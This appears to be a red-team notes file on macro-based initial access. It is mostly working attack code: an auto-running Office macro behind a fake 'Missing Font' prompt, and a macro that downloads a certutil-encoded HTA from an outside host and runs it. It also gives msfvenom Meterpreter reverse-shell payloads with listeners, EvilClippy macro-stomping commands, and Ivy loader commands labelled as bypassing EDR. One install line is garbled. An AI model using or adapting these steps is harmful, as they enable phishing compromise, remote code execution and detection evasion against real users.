# MACRO Attack

simple macro 

```
Sub AutoOpen()
    Nooranet
End Sub
Sub Nooranet()
  MsgBox "Download Missing Font Automatic", vbOKOnly, "Missing Font"
  a = Shell("E:\Intial-Access\Macro\screen.cmd", vbHide)
End Sub
```

salaray-1401.xslm

```powershell
```powershell
Sub Auto_Open()
    DownloadAndExec
End Sub
Sub DownloadAndExec()
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://nooranetred.com/edr.cert", False
xHttp.Send
With bStrm
.Type = 1 '//binary
.Open
.write xHttp.responseBody
.savetofile "edr.cert", 2 '//overwrite
End With
Shell ("cmd /c certutil -decode edr.cert edr.hta & start edr.hta")
End Sub
```

```
#### payload

```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f hta-psk -o /var/www/html/cert.hta
```

##### 

##### Encode payload

```powershell
$raw = Get-Content -path cert.hta -Encoding Byte
$b64 =[system.Convert]::TOBase64String($raw)
$b64  | Out-File E:\Initial-Access\Macro\edr.cert
```

#### listener

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```

## Evil clippy

##### installation

```
git clone https://github.com/outflanknl/EvilClippy
```

```
EvilClippy.exe -g secret-salary.xlsm
```

```
EvilClippy.exe -u secret-salary.xlsm
```

```
EvilClippy.exe -uu secret-salary.xlsm
```

## IVY

#### Installation

```
hgo build Ivy.gottps://github.com/optiv/Ivy
go get github.com/fatih/color
go get github.com/KyleBanks/XOREncryption/Go
go build Ivy.go
```

#### IVY Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f vbs -o /var/www/html/shell.vbs
```

#### listener

```
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```

### Staged Payload

```
ivy -Ix86 shell.vbs -P Inject -O test.js
```

```
cscript //E:jscript whatsapp.js
```

#### Stageless payload

stageless payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f raw -o /var/www/html/shell.bin
```

```
ivy  stageless -Ix86 shell.bin -P Inject -O test.js
```

#### onliner command

```
ivy  -stageless -Ix86 shell.bin -P Inject -O test.png
```

#### Bypass EDR

```command
ivy -stageless -Ix86 shell.bin -P Inject -unhook -O test.png
```

```

```
